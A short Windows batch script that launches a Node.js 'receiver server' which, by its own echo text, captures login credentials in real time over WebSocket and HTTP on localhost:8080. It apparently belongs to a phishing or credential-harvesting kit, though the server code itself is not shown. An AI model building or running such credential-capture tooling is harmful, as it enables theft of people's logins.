@echo off
echo Starting Receiver Server...
echo.
echo This server will capture login credentials in real-time
echo WebSocket: ws://localhost:8080
echo HTTP: http://localhost:8080
echo.
cd /d "%~dp0database"
node receiver-server.js
pause